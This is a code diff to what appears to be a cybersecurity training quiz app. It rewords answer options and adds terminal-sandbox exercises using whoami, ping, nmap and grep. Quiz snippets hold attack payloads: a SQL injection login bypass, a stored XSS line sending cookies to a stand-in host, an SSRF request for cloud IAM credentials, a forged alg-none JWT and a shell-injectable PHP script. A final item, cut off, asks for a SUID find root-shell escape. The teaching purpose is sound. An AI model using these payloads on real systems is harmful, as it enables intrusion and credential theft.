@@ -16,10 +16,10 @@ export const BEGINNER_DIAGNOSTIC_QUESTIONS_EN: HardcoreQuestion[] = [
     prompt: 'Why is Multi-Factor Authentication (MFA) critical even when an operator uses a complex password?',
     codeSnippet: 'LOGIN ATTEMPT:\nUsername: admin\nPassword: ********** [MATCH]\nMFA OTP Code: ???',
     options: [
-      { id: 'bm_opt1', text: 'Blocks login even if password is leaked in a breach', isCorrect: true, explanation: 'MFA requires a second proof of identity (TOTP/token), preventing credential reuse.' },
-      { id: 'bm_opt2', text: 'Accelerates network connection download speeds', isCorrect: false },
-      { id: 'bm_opt3', text: 'Removes the need for host endpoint antivirus', isCorrect: false },
-      { id: 'bm_opt4', text: 'Physically encrypts the local hardware drive', isCorrect: false }
+      { id: 'bm_opt1', text: 'Prevents account takeover even if passwords are leaked in breaches', isCorrect: true, explanation: 'MFA requires a second proof of identity (TOTP/token), preventing credential reuse.' },
+      { id: 'bm_opt2', text: 'Accelerates TLS handshake speed during high-volume server logins', isCorrect: false },
+      { id: 'bm_opt3', text: 'Eliminates the requirement for installing endpoint antivirus software', isCorrect: false },
+      { id: 'bm_opt4', text: 'Encrypts physical drive partitions against forensic recovery tools', isCorrect: false }
     ],
     rootCauseBreakdown: {
       cveOrTopic: 'NIST SP 800-63B: Digital Identity Guidelines',
@@ -40,9 +40,9 @@ export const BEGINNER_DIAGNOSTIC_QUESTIONS_EN: HardcoreQuestion[] = [
     codeSnippet: 'EMAIL SENDER: Security Team <alert@corporate-update.org>\nACTION: Verify your credentials immediately',
     options: [
       { id: 'bp_opt1', text: 'https://login-micros0ft.support-verify.com', isCorrect: true, explanation: 'The domain is support-verify.com with a typo-squatted subdomain mimicking Microsoft.' },
-      { id: 'bp_opt2', text: 'https://account.microsoft.com/security', isCorrect: false },
-      { id: 'bp_opt3', text: 'https://login.live.com/oauth2', isCorrect: false },
-      { id: 'bp_opt4', text: 'https://portal.office.com/landing', isCorrect: false }
+      { id: 'bp_opt2', text: 'https://account.microsoft.com/security-auth', isCorrect: false },
+      { id: 'bp_opt3', text: 'https://login.live.com/oauth2-token-exchange', isCorrect: false },
+      { id: 'bp_opt4', text: 'https://portal.office.com/landing-protection', isCorrect: false }
     ],
     rootCauseBreakdown: {
       cveOrTopic: 'MITRE ATT&CK T1566: Phishing & Typo-Squatting',
@@ -62,10 +62,10 @@ export const BEGINNER_DIAGNOSTIC_QUESTIONS_EN: HardcoreQuestion[] = [
     prompt: 'What does the Principle of Least Privilege (PoLP) dictate in secure architecture?',
     codeSnippet: 'ACCESS MATRIX:\nOperator: Developer\nRequested: Domain Admin (Full Root)\nPolicy: ???',
     options: [
-      { id: 'bl_opt1', text: 'Grant only minimum permissions required for duties', isCorrect: true, explanation: 'Restricting permissions minimizes blast radius if an individual account is compromised.' },
-      { id: 'bl_opt2', text: 'Give root administrative access to all employees', isCorrect: false },
-      { id: 'bl_opt3', text: 'Share one master password across entire departments', isCorrect: false },
-      { id: 'bl_opt4', text: 'Disable firewall rules to accelerate engineering work', isCorrect: false }
+      { id: 'bl_opt1', text: 'Assign solely the minimum access rights essential for job duties', isCorrect: true, explanation: 'Restricting permissions minimizes blast radius if an individual account is compromised.' },
+      { id: 'bl_opt2', text: 'Elevate all authenticated users to global domain administrators', isCorrect: false },
+      { id: 'bl_opt3', text: 'Distribute an identical master credential to entire departments', isCorrect: false },
+      { id: 'bl_opt4', text: 'Deactivate host firewalls to accelerate engineering workflows', isCorrect: false }
     ],
     rootCauseBreakdown: {
       cveOrTopic: 'Principle of Least Privilege (PoLP)',
@@ -85,10 +85,10 @@ export const BEGINNER_DIAGNOSTIC_QUESTIONS_EN: HardcoreQuestion[] = [
     prompt: 'An unexpected archive arrives via email. Which filename represents a dangerous hidden executable payload?',
     codeSnippet: 'ARCHIVE CONTENTS:\n[1] README.txt\n[2] Contract.pdf\n[3] Invoice_Payment.pdf.exe\n[4] Logo.png',
     options: [
-      { id: 'bx_opt1', text: 'Invoice_Payment.pdf.exe (executable payload)', isCorrect: true, explanation: 'Double extensions trick OS file managers while Windows executes the file as a PE binary.' },
-      { id: 'bx_opt2', text: 'Contract.pdf (document)', isCorrect: false },
-      { id: 'bx_opt3', text: 'README.txt (text file)', isCorrect: false },
-      { id: 'bx_opt4', text: 'Logo.png (image)', isCorrect: false }
+      { id: 'bx_opt1', text: 'Invoice_Payment_2026.pdf.exe', isCorrect: true, explanation: 'Double extensions trick OS file managers while Windows executes the file as a PE binary.' },
+      { id: 'bx_opt2', text: 'Employment_Contract_2026.pdf', isCorrect: false },
+      { id: 'bx_opt3', text: 'Quarterly_Brief_Summary.txt', isCorrect: false },
+      { id: 'bx_opt4', text: 'Branding_Identity_Logo.png', isCorrect: false }
     ],
     rootCauseBreakdown: {
       cveOrTopic: 'Double Extension Masquerading (MITRE T1036.007)',
@@ -108,10 +108,10 @@ export const BEGINNER_DIAGNOSTIC_QUESTIONS_EN: HardcoreQuestion[] = [
     prompt: 'What is the primary operational role of an enterprise network firewall?',
     codeSnippet: 'INCOMING TCP PACKET -> [FIREWALL ACL] -> LOCAL HOST',
     options: [
-      { id: 'bf_opt1', text: 'Filter and block unauthorized network connections', isCorrect: true, explanation: 'Firewalls inspect packet headers and drop traffic that violates defined security policies.' },
-      { id: 'bf_opt2', text: 'Double broadband transmission download speed', isCorrect: false },
-      { id: 'bf_opt3', text: 'Store relational SQL database transaction logs', isCorrect: false },
-      { id: 'bf_opt4', text: 'Automatically update browser search history', isCorrect: false }
+      { id: 'bf_opt1', text: 'Inspect packet headers to drop unauthorized network connections', isCorrect: true, explanation: 'Firewalls inspect packet headers and drop traffic that violates defined security policies.' },
+      { id: 'bf_opt2', text: 'Cache static assets locally to accelerate download transmission', isCorrect: false },
+      { id: 'bf_opt3', text: 'Encrypt hard drive sectors against unauthorized offline imaging', isCorrect: false },
+      { id: 'bf_opt4', text: 'Balance incoming web traffic across redundant application servers', isCorrect: false }
     ],
     rootCauseBreakdown: {
       cveOrTopic: 'Stateful Packet Inspection (SPI)',
@@ -131,10 +131,10 @@ export const BEGINNER_DIAGNOSTIC_QUESTIONS_EN: HardcoreQuestion[] = [
     prompt: 'How is Social Engineering defined in modern offensive cybersecurity?',
     codeSnippet: 'CALLER: "Hello, this is IT Helpdesk. We need your VPN PIN for maintenance."',
     options: [
-      { id: 'bs_opt1', text: 'Psychological manipulation to trick victims into revealing secrets', isCorrect: true, explanation: 'Attackers exploit human trust, urgency, or authority rather than technical software bugs.' },
-      { id: 'bs_opt2', text: 'Hardware overheating inside server cooling systems', isCorrect: false },
-      { id: 'bs_opt3', text: 'Automated compilation of Linux operating systems', isCorrect: false },
-      { id: 'bs_opt4', text: 'Measuring physical Wi-Fi signal attenuation over distance', isCorrect: false }
+      { id: 'bs_opt1', text: 'Psychological manipulation to trick victims into yielding secrets', isCorrect: true, explanation: 'Attackers exploit human trust, urgency, or authority rather than technical software bugs.' },
+      { id: 'bs_opt2', text: 'Reverse engineering binary assemblies to discover buffer overflows', isCorrect: false },
+      { id: 'bs_opt3', text: 'Hardware fault injection via clock glitching on cryptographic chips', isCorrect: false },
+      { id: 'bs_opt4', text: 'Exhausting network switch memory using rapid MAC address flooding', isCorrect: false }
     ],
     rootCauseBreakdown: {
       cveOrTopic: 'Social Engineering & Pretexting (MITRE T1566)',
@@ -144,6 +144,58 @@ export const BEGINNER_DIAGNOSTIC_QUESTIONS_EN: HardcoreQuestion[] = [
     },
     xpReward: 30,
     eloReward: 15
+  },
+  {
+    id: 'diag_beg_term_whoami',
+    title: 'Terminal Sandbox: Identity Verification',
+    type: 'terminal_command',
+    domain: 'Linux & Bash',
+    difficulty: 'Beginner',
+    prompt: 'In an active Linux terminal, determine the username of the current operating user session:',
+    terminalPrompt: 'operator@zeroday:~$',
+    commandPrefix: '',
+    commandTarget: 'whoami',
+    commandChips: ['whoami', 'id', 'uname -a', 'pwd', 'ls -la'],
+    options: [
+      { id: 'bw_1', text: 'whoami', isCorrect: true, explanation: 'Prints the effective username of the current logged-in user.' },
+      { id: 'bw_2', text: 'pwd', isCorrect: false },
+      { id: 'bw_3', text: 'uname -a', isCorrect: false },
+      { id: 'bw_4', text: 'ls -la', isCorrect: false }
+    ],
+    rootCauseBreakdown: {
+      cveOrTopic: 'Linux User Identity & Session Discovery',
+      whyItWorks: 'The whoami utility inspects the effective UID of the current shell and prints the associated account name.',
+      patchRecommendation: 'Verify effective identity during audits to prevent accidental command execution as root.',
+      terminalProof: '$ whoami\nroot'
+    },
+    xpReward: 35,
+    eloReward: 18
+  },
+  {
+    id: 'diag_beg_term_ping',
+    title: 'Terminal Sandbox: ICMP Connectivity Check',
+    type: 'terminal_command',
+    domain: 'Networking',
+    difficulty: 'Beginner',
+    prompt: 'Send exactly 4 ICMP Echo Request packets to test network reachability to Google Public DNS (8.8.8.8):',
+    terminalPrompt: 'operator@zeroday:~$',
+    commandPrefix: 'ping',
+    commandTarget: 'ping -c 4 8.8.8.8',
+    commandChips: ['-c 4 8.8.8.8', '-t 4 8.8.8.8', '8.8.8.8 -n 4', '--count 4 8.8.8.8'],
+    options: [
+      { id: 'bp_1', text: '-c 4 8.8.8.8', isCorrect: true, explanation: 'The -c flag specifies the exact packet count to send under Linux ping.' },
+      { id: 'bp_2', text: '-t 4 8.8.8.8', isCorrect: false },
+      { id: 'bp_3', text: '8.8.8.8 -n 4', isCorrect: false },
+      { id: 'bp_4', text: '--count 4 8.8.8.8', isCorrect: false }
+    ],
+    rootCauseBreakdown: {
+      cveOrTopic: 'RFC 792 Internet Control Message Protocol (ICMP)',
+      whyItWorks: 'Ping generates ICMP Echo Requests (Type 8) and evaluates Echo Replies (Type 0) to measure latency and packet loss.',
+      patchRecommendation: 'Rate-limit ICMP ingress traffic at perimeter firewalls to prevent network reconnaissance sweep scans.',
+      terminalProof: '$ ping -c 4 8.8.8.8\n4 packets transmitted, 4 received, 0% packet loss'
+    },
+    xpReward: 35,
+    eloReward: 18
   }
 ];
 
@@ -157,10 +209,10 @@ export const INTERMEDIATE_DIAGNOSTIC_QUESTIONS_EN: HardcoreQuestion[] = [
     prompt: 'Which payload string causes the authentication logic bypass in the raw HTTP request below?',
     codeSnippet: 'POST /api/v1/auth/session HTTP/1.1\n{"username": "admin\' OR 1=1-- -", "pass": "x"}',
     options: [
-      { id: 'i1_opt1', text: 'Tautology: "OR 1=1" forces WHERE clause to evaluate TRUE', isCorrect: true, explanation: 'The injected condition renders the query true, and comments discard the remaining password check.' },
-      { id: 'i1_opt2', text: 'JSON key "pass" is bypassed via HTTP smuggling', isCorrect: false },
-      { id: 'i1_opt3', text: 'Port 8443 transmits unencrypted session cookies', isCorrect: false },
-      { id: 'i1_opt4', text: 'Content-Length header triggers buffer overrun', isCorrect: false }
+      { id: 'i1_opt1', text: 'Tautology injection forces SQL WHERE clause to evaluate TRUE', isCorrect: true, explanation: 'The injected condition renders the query true, and comments discard the remaining password check.' },
+      { id: 'i1_opt2', text: 'Broken session serialization bypasses backend authenticator', isCorrect: false },
+      { id: 'i1_opt3', text: 'Unencrypted HTTP cookie exposes cleartext token on wire line', isCorrect: false },
+      { id: 'i1_opt4', text: 'Malformed Content-Length triggers heap overflow crash dump', isCorrect: false }
     ],
     rootCauseBreakdown: {
       cveOrTopic: 'CWE-89: SQL Injection',
@@ -180,10 +232,10 @@ export const INTERMEDIATE_DIAGNOSTIC_QUESTIONS_EN: HardcoreQuestion[] = [
     prompt: 'During a SYN scan (-sS), the target responds with [RST, ACK]. What port state does this indicate?',
     codeSnippet: 'FRAME: TCP 10.10.10.50:443 -> 192.168.1.15\nFlags: [RST, ACK], Seq=0, Ack=1',
     options: [
-      { id: 'i2_opt1', text: 'CLOSED (Host reachable, actively rejects connection)', isCorrect: true, explanation: 'An RST/ACK packet indicates the host OS is active but no service is bound to that port.' },
-      { id: 'i2_opt2', text: 'OPEN (Listening for TLS ClientHello)', isCorrect: false },
-      { id: 'i2_opt3', text: 'FILTERED (Firewall dropped inbound packet)', isCorrect: false },
-      { id: 'i2_opt4', text: 'Active ARP cache poisoning detected', isCorrect: false }
+      { id: 'i2_opt1', text: 'CLOSED: Host is alive but actively resets incoming TCP connection', isCorrect: true, explanation: 'An RST/ACK packet indicates the host OS is active but no service is bound to that port.' },
+      { id: 'i2_opt2', text: 'OPEN: Target socket is actively listening for incoming TCP SYN', isCorrect: false },
+      { id: 'i2_opt3', text: 'FILTERED: Stateful firewall silently dropped incoming TCP probe', isCorrect: false },
+      { id: 'i2_opt4', text: 'SPOOFED: Unsolicited ARP reply poisoned local interface router', isCorrect: false }
     ],
     rootCauseBreakdown: {
       cveOrTopic: 'RFC 793 TCP Port States',
@@ -203,10 +255,10 @@ export const INTERMEDIATE_DIAGNOSTIC_QUESTIONS_EN: HardcoreQuestion[] = [
     prompt: 'Why does the binary below permit immediate privilege escalation to root?',
     codeSnippet: '$ ls -la /usr/bin/find\n-rwsr-xr-x 1 root root 224840 May 12 /usr/bin/find',
     options: [
-      { id: 'i3_opt1', text: 'SUID bit set ("s"): executes with effective root UID', isCorrect: true, explanation: 'The SUID permission causes the process to run with the permissions of its owner (root).' },
-      { id: 'i3_opt2', text: 'File has world-writable write permissions', isCorrect: false },
-      { id: 'i3_opt3', text: 'Encrypted binary decryptable only via kernel keyring', isCorrect: false },
-      { id: 'i3_opt4', text: 'Execute-only flags prevent disassembly analysis', isCorrect: false }
+      { id: 'i3_opt1', text: 'SUID permission bit set: binary executes under effective root UID', isCorrect: true, explanation: 'The SUID permission causes the process to run with the permissions of its owner (root).' },
+      { id: 'i3_opt2', text: 'World-writable file permissions allow unprivileged script overwrite', isCorrect: false },
+      { id: 'i3_opt3', text: 'Executable binary decryptable solely using privileged kernel keyring', isCorrect: false },
+      { id: 'i3_opt4', text: 'Execute-only memory flags prevent dynamic reverse engineering hooks', isCorrect: false }
     ],
     rootCauseBreakdown: {
       cveOrTopic: 'SUID Privilege Escalation (GTFOBins)',
@@ -226,10 +278,10 @@ export const INTERMEDIATE_DIAGNOSTIC_QUESTIONS_EN: HardcoreQuestion[] = [
     prompt: 'What architectural vulnerability allows an attacker to forge arbitrary JSON Web Tokens (JWT)?',
     codeSnippet: 'HEADER: {"alg": "none", "typ": "JWT"}\nPAYLOAD: {"user": "admin", "role": "root"}',
     options: [
-      { id: 'i4_opt1', text: 'Accepting "alg": "none" without signature verification', isCorrect: true, explanation: 'The "none" algorithm instructs vulnerable libraries to skip cryptographic verification.' },
-      { id: 'i4_opt2', text: 'Payload is stored unencrypted in Base64', isCorrect: false },
-      { id: 'i4_opt3', text: 'Tokens missing mandatory "exp" expiration claim', isCorrect: false },
-      { id: 'i4_opt4', text: 'HMAC keys requiring RSA public certificates', isCorrect: false }
+      { id: 'i4_opt1', text: 'Accepting "alg": "none" skips cryptographic token verification', isCorrect: true, explanation: 'The "none" algorithm instructs vulnerable libraries to skip cryptographic verification.' },
+      { id: 'i4_opt2', text: 'Base64 payload encoding exposes private claims in cleartext', isCorrect: false },
+      { id: 'i4_opt3', text: 'Missing mandatory "exp" expiration timestamp leaves token active', isCorrect: false },
+      { id: 'i4_opt4', text: 'HMAC secret key requires verified external X.509 certificates', isCorrect: false }
     ],
     rootCauseBreakdown: {
       cveOrTopic: 'JWT Alg None Vulnerability (RFC 7519)',
@@ -249,10 +301,10 @@ export const INTERMEDIATE_DIAGNOSTIC_QUESTIONS_EN: HardcoreQuestion[] = [
     prompt: 'What distinguishes Stored XSS (Persistent) from Reflected XSS?',
     codeSnippet: 'STORED: <script>fetch("http://hacker.xyz/?c="+document.cookie)</script>',
     options: [
-      { id: 'i5_opt1', text: 'Payload is saved in backend database and affects all visitors', isCorrect: true, explanation: 'Stored XSS persists in server-side storage and automatically executes for any user viewing the page.' },
-      { id: 'i5_opt2', text: 'Stored XSS only executes inside the browser developer console', isCorrect: false },
-      { id: 'i5_opt3', text: 'Reflected XSS permanently alters server filesystem files', isCorrect: false },
-      { id: 'i5_opt4', text: 'Stored XSS is automatically sanitized by TLS certificates', isCorrect: false }
+      { id: 'i5_opt1', text: 'Payload persists in backend database and executes for every viewer', isCorrect: true, explanation: 'Stored XSS persists in server-side storage and automatically executes for any user viewing the page.' },
+      { id: 'i5_opt2', text: 'Script executes exclusively inside local client developer console', isCorrect: false },
+      { id: 'i5_opt3', text: 'Injected script permanently modifies filesystem files on the host', isCorrect: false },
+      { id: 'i5_opt4', text: 'Malicious payload is automatically sanitized by TLS certificates', isCorrect: false }
     ],
     rootCauseBreakdown: {
       cveOrTopic: 'CWE-79: Cross-Site Scripting (XSS)',
@@ -272,10 +324,10 @@ export const INTERMEDIATE_DIAGNOSTIC_QUESTIONS_EN: HardcoreQuestion[] = [
     prompt: 'In standard IPv4 CIDR notation, how many assignable host addresses are available in a /24 subnet?',
     codeSnippet: 'NETWORK: 192.168.1.0/24\nNETMASK: 255.255.255.0',
     options: [
-      { id: 'i6_opt1', text: '254 usable host addresses (256 minus network & broadcast)', isCorrect: true, explanation: 'A /24 subnet has 2^(32-24) = 256 addresses; subtracting network (.0) and broadcast (.255) leaves 254.' },
-      { id: 'i6_opt2', text: '256 usable host addresses', isCorrect: false },
-      { id: 'i6_opt3', text: '512 usable host addresses', isCorrect: false },
-      { id: 'i6_opt4', text: '128 usable host addresses', isCorrect: false }
+      { id: 'i6_opt1', text: '254 usable host IP addresses', isCorrect: true, explanation: 'A /24 subnet has 2^(32-24) = 256 addresses; subtracting network (.0) and broadcast (.255) leaves 254.' },
+      { id: 'i6_opt2', text: '256 usable host IP addresses', isCorrect: false },
+      { id: 'i6_opt3', text: '252 usable host IP addresses', isCorrect: false },
+      { id: 'i6_opt4', text: '128 usable host IP addresses', isCorrect: false }
     ],
     rootCauseBreakdown: {
       cveOrTopic: 'RFC 4632 Classless Inter-Domain Routing',
@@ -285,6 +337,58 @@ export const INTERMEDIATE_DIAGNOSTIC_QUESTIONS_EN: HardcoreQuestion[] = [
     },
     xpReward: 50,
     eloReward: 25
+  },
+  {
+    id: 'diag_int_term_nmap',
+    title: 'Terminal Sandbox: Stealth Port Discovery',
+    type: 'terminal_command',
+    domain: 'Networking',
+    difficulty: 'Intermediate',
+    prompt: 'Perform a half-open TCP SYN scan (-sS) against ports 80 and 443 on target host 192.168.1.10:',
+    terminalPrompt: 'operator@zeroday:~$',
+    commandPrefix: 'nmap',
+    commandTarget: 'nmap -sS -p 80,443 192.168.1.10',
+    commandChips: ['-sS -p 80,443 192.168.1.10', '-sT -p 80,443 192.168.1.10', '-sU -p 80,443 192.168.1.10', '-p 80,443 -A 192.168.1.10'],
+    options: [
+      { id: 'in_1', text: '-sS -p 80,443 192.168.1.10', isCorrect: true, explanation: 'The -sS flag initiates a half-open TCP SYN scan without completing the 3-way handshake.' },
+      { id: 'in_2', text: '-sT -p 80,443 192.168.1.10', isCorrect: false },
+      { id: 'in_3', text: '-sU -p 80,443 192.168.1.10', isCorrect: false },
+      { id: 'in_4', text: '-p 80,443 -A 192.168.1.10', isCorrect: false }
+    ],
+    rootCauseBreakdown: {
+      cveOrTopic: 'TCP SYN Scanning Mechanics (Half-Open Scan)',
+      whyItWorks: 'SYN scanning avoids completing full TCP handshakes by tearing down connections with RST packets immediately upon receiving SYN/ACK.',
+      patchRecommendation: 'Implement network intrusion detection (Snort/Suricata) rules flagging anomalous half-open TCP connection spikes.',
+      terminalProof: '$ nmap -sS -p 80,443 192.168.1.10\n80/tcp  open  http\n443/tcp open  ssl/https'
+    },
+    xpReward: 55,
+    eloReward: 28
+  },
+  {
+    id: 'diag_int_term_grep',
+    title: 'Terminal Sandbox: Credential Leak Extraction',
+    type: 'terminal_command',
+    domain: 'Defense & SOC',
+    difficulty: 'Intermediate',
+    prompt: 'Search case-insensitively (-i) for leaked credentials matching "DATABASE_URL" in config.json:',
+    terminalPrompt: 'operator@zeroday:~$',
+    commandPrefix: 'grep',
+    commandTarget: 'grep -i "DATABASE_URL" config.json',
+    commandChips: ['-i "DATABASE_URL" config.json', '-v "DATABASE_URL" config.json', '-c "DATABASE_URL" config.json', '-n "DATABASE_URL" --binary config.json'],
+    options: [
+      { id: 'ig_1', text: '-i "DATABASE_URL" config.json', isCorrect: true, explanation: 'The -i flag ignores uppercase/lowercase distinctions during pattern matching.' },
+      { id: 'ig_2', text: '-v "DATABASE_URL" config.json', isCorrect: false },
+      { id: 'ig_3', text: '-c "DATABASE_URL" config.json', isCorrect: false },
+      { id: 'ig_4', text: '-n "DATABASE_URL" --binary config.json', isCorrect: false }
+    ],
+    rootCauseBreakdown: {
+      cveOrTopic: 'Log Analysis & Forensic Pattern Extraction',
+      whyItWorks: 'Grep parses text streams with regular expressions, allowing rapid triage of secrets committed to source trees.',
+      patchRecommendation: 'Install pre-commit hooks (e.g. GitLeaks, Trufflehog) to block credentials from being pushed to repositories.',
+      terminalProof: '$ grep -i "DATABASE_URL" config.json\nDATABASE_URL: mysql://db_admin:P@ssw0rd123!@10.0.0.50:3306/prod'
+    },
+    xpReward: 55,
+    eloReward: 28
   }
 ];
 
@@ -298,10 +402,10 @@ export const ADVANCED_DIAGNOSTIC_QUESTIONS_EN: HardcoreQuestion[] = [
     prompt: 'An attacker modifies `user_id=104` to `user_id=1` in an API call and receives the CEO payroll. What flaw is this?',
     codeSnippet: 'GET /api/v2/payroll?user_id=1 HTTP/1.1\nCookie: session=operator_104_token\n\nHTTP/1.1 200 OK\n{"salary": 250000, "name": "CEO"}',
     options: [
-      { id: 'a1_opt1', text: 'IDOR: Horizontal access control missing server-side authorization check', isCorrect: true, explanation: 'The backend trusted the user-supplied identifier without validating ownership against the session.' },
-      { id: 'a1_opt2', text: 'Reflected Cross-Site Scripting (XSS) in query string', isCorrect: false },
-      { id: 'a1_opt3', text: 'SQL Injection via JSON body parsing', isCorrect: false },
-      { id: 'a1_opt4', text: 'Buffer overflow on stack pointer register', isCorrect: false }
+      { id: 'a1_opt1', text: 'IDOR: Server omits authorization check on client-provided user identifier', isCorrect: true, explanation: 'The backend trusted the user-supplied identifier without validating ownership against the session.' },
+      { id: 'a1_opt2', text: 'SQLi: Unsanitized integer parameter concatenated in database query logic', isCorrect: false },
+      { id: 'a1_opt3', text: 'XSS: Reflected payload rendered without context-aware HTML entity escaping', isCorrect: false },
+      { id: 'a1_opt4', text: 'CSRF: State-changing request accepted without validating anti-forgery token', isCorrect: false }
     ],
     rootCauseBreakdown: {
       cveOrTopic: 'CWE-639: Insecure Direct Object Reference (IDOR)',
@@ -321,10 +425,10 @@ export const ADVANCED_DIAGNOSTIC_QUESTIONS_EN: HardcoreQuestion[] = [
     prompt: 'Why does the PHP script below allow Remote Code Execution (RCE)?',
     codeSnippet: '<?php\n$host = $_GET["target"];\nsystem("ping -c 2 " . $host);\n?>',
     options: [
-      { id: 'a2_opt1', text: 'Unsanitized input concatenated into system() allows command chaining (e.g. ; id)', isCorrect: true, explanation: 'Shell metacharacters like ; & | allow attackers to append arbitrary system commands.' },
-      { id: 'a2_opt2', text: 'File upload without MIME verification', isCorrect: false },
-      { id: 'a2_opt3', text: 'Insecure Python pickle object deserialization', isCorrect: false },
-      { id: 'a2_opt4', text: 'Format string memory corruption in printf', isCorrect: false }
+      { id: 'a2_opt1', text: 'Input concatenated into system() allows shell command chaining like "; id"', isCorrect: true, explanation: 'Shell metacharacters like ; & | allow attackers to append arbitrary system commands.' },
+      { id: 'a2_opt2', text: 'Multipart file upload lacking MIME verification executes as web shell', isCorrect: false },
+      { id: 'a2_opt3', text: 'Insecure object deserialization instantiates weaponized Python gadgets', isCorrect: false },
+      { id: 'a2_opt4', text: 'Format string specifier in printf corrupts arbitrary memory pointers', isCorrect: false }
     ],
     rootCauseBreakdown: {
       cveOrTopic: 'CWE-78: OS Command Injection',
@@ -344,10 +448,10 @@ export const ADVANCED_DIAGNOSTIC_QUESTIONS_EN: HardcoreQuestion[] = [
     prompt: 'In an x86_64 stack buffer overflow, which CPU register is overwritten to hijack execution flow?',
     codeSnippet: '[Buffer 64 bytes] -> [Saved RBP 8 bytes] -> [RETURN ADDRESS (RIP)]',
     options: [
-      { id: 'a3_opt1', text: 'RIP (Instruction Pointer / Return Address)', isCorrect: true, explanation: 'Overwriting the return address causes the RET instruction to jump to attacker-controlled memory.' },
-      { id: 'a3_opt2', text: 'RSP (Stack Pointer Register)', isCorrect: false },
-      { id: 'a3_opt3', text: 'RAX (General Purpose Accumulator)', isCorrect: false },
-      { id: 'a3_opt4', text: 'RFLAGS (CPU Flag Register)', isCorrect: false }
+      { id: 'a3_opt1', text: 'RIP (64-bit Instruction Pointer / Return Address)', isCorrect: true, explanation: 'Overwriting the return address causes the RET instruction to jump to attacker-controlled memory.' },
+      { id: 'a3_opt2', text: 'RSP (64-bit Top-of-Stack Pointer Memory Register)', isCorrect: false },
+      { id: 'a3_opt3', text: 'RAX (64-bit General Purpose Accumulator Register)', isCorrect: false },
+      { id: 'a3_opt4', text: 'RBP (64-bit Base Frame Pointer Reference Register)', isCorrect: false }
     ],
     rootCauseBreakdown: {
       cveOrTopic: 'CWE-121: Stack-based Buffer Overflow',
@@ -367,10 +471,10 @@ export const ADVANCED_DIAGNOSTIC_QUESTIONS_EN: HardcoreQuestion[] = [
     prompt: 'In a cloud environment (AWS/GCP), what is the most critical target of an SSRF vulnerability?',
     codeSnippet: 'POST /api/fetch_avatar?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/',
     options: [
-      { id: 'a4_opt1', text: 'Instance Metadata Service (IMDS) exposing temporary IAM credentials', isCorrect: true, explanation: 'The link-local metadata IP yields IAM role tokens, allowing full infrastructure takeover.' },
-      { id: 'a4_opt2', text: 'Client browser history and cached cookies', isCorrect: false },
-      { id: 'a4_opt3', text: 'Local DNS cache poisoning on client WiFi', isCorrect: false },
-      { id: 'a4_opt4', text: 'Exhaustion of physical router MAC tables', isCorrect: false }
+      { id: 'a4_opt1', text: 'Cloud Instance Metadata Service (IMDS) yielding temporary IAM role tokens', isCorrect: true, explanation: 'The link-local metadata IP yields IAM role tokens, allowing full infrastructure takeover.' },
+      { id: 'a4_opt2', text: 'Client browser local storage holding cached authentication access cookies', isCorrect: false },
+      { id: 'a4_opt3', text: 'Gateway resolver cache poisoned via forged UDP DNS response transaction IDs', isCorrect: false },
+      { id: 'a4_opt4', text: 'Switch interface CAM table saturated through rapid spoofed MAC generation', isCorrect: false }
     ],
     rootCauseBreakdown: {
       cveOrTopic: 'CWE-918: Server-Side Request Forgery (SSRF)',
@@ -390,10 +494,10 @@ export const ADVANCED_DIAGNOSTIC_QUESTIONS_EN: HardcoreQuestion[] = [
     prompt: 'What defense mechanism does Address Space Layout Randomization (ASLR) provide against buffer overflows?',
     codeSnippet: 'RUN 1: libc base = 0x7f81a2000000\nRUN 2: libc base = 0x7f43b8c00000',
     options: [
-      { id: 'a5_opt1', text: 'Randomizes memory offsets of stack, heap, and libraries on each run', isCorrect: true, explanation: 'ASLR prevents attackers from reliably jumping to static function addresses or ROP gadgets.' },
-      { id: 'a5_opt2', text: 'Makes stack memory strictly read-only', isCorrect: false },
-      { id: 'a5_opt3', text: 'Cryptographically signs compiled executable binaries', isCorrect: false },
-      { id: 'a5_opt4', text: 'Disables all relative pointer arithmetic in CPU', isCorrect: false }
+      { id: 'a5_opt1', text: 'Randomizes memory base addresses of stack, heap, and shared libraries', isCorrect: true, explanation: 'ASLR prevents attackers from reliably jumping to static function addresses or ROP gadgets.' },
+      { id: 'a5_opt2', text: 'Enforces strict read-only execution permissions on the thread runtime stack', isCorrect: false },
+      { id: 'a5_opt3', text: 'Cryptographically signs compiled binary headers against memory modification', isCorrect: false },
+      { id: 'a5_opt4', text: 'Deactivates relative memory offset arithmetic across instruction registers', isCorrect: false }
     ],
     rootCauseBreakdown: {
       cveOrTopic: 'Mitigation: ASLR & PIE (Position Independent Executable)',
@@ -413,10 +517,10 @@ export const ADVANCED_DIAGNOSTIC_QUESTIONS_EN: HardcoreQuestion[] = [
     prompt: 'Why is `Access-Control-Allow-Origin: null` with `Credentials: true` a severe security risk?',
     codeSnippet: 'HTTP/1.1 200 OK\nAccess-Control-Allow-Origin: null\nAccess-Control-Allow-Credentials: true',
     options: [
-      { id: 'a6_opt1', text: 'Sandboxed iframes generate Origin "null", allowing cross-origin credential leaks', isCorrect: true, explanation: 'Any attacker can embed a sandboxed iframe to trigger Origin: null and steal authenticated session data.' },
-      { id: 'a6_opt2', text: 'It completely disables TLS certificate validation in browsers', isCorrect: false },
-      { id: 'a6_opt3', text: 'It forces client browsers to execute server shell scripts', isCorrect: false },
-      { id: 'a6_opt4', text: 'It prevents valid users from submitting forms', isCorrect: false }
+      { id: 'a6_opt1', text: 'Sandboxed iframes emit Origin "null", allowing cross-origin credential theft', isCorrect: true, explanation: 'Any attacker can embed a sandboxed iframe to trigger Origin: null and steal authenticated session data.' },
+      { id: 'a6_opt2', text: 'Overly permissive origin header forces browsers to skip TLS certificate checks', isCorrect: false },
+      { id: 'a6_opt3', text: 'Cross-origin response triggers client browser to execute remote shell payloads', isCorrect: false },
+      { id: 'a6_opt4', text: 'Missing preflight verification blocks authenticated users from posting forms', isCorrect: false }
     ],
     rootCauseBreakdown: {
       cveOrTopic: 'CWE-942: Overly Permissive CORS Policy',
@@ -426,6 +530,63 @@ export const ADVANCED_DIAGNOSTIC_QUESTIONS_EN: HardcoreQuestion[] = [
     },
     xpReward: 70,
     eloReward: 35
+  },
+  {
+    id: 'diag_adv_term_find',
+    title: 'Terminal Sandbox: SUID Shell Escape',
+    type: 'terminal_command',
+    domain: 'Linux & Bash',
+    difficulty: 'Zero-Day',
+    prompt: 'Exploit the SUID-enabled `find` binary to execute an interactive privileged root shell (-exec):',
+    terminalPrompt: 'operator@zeroday:~$',
+    commandPrefix: 'find',
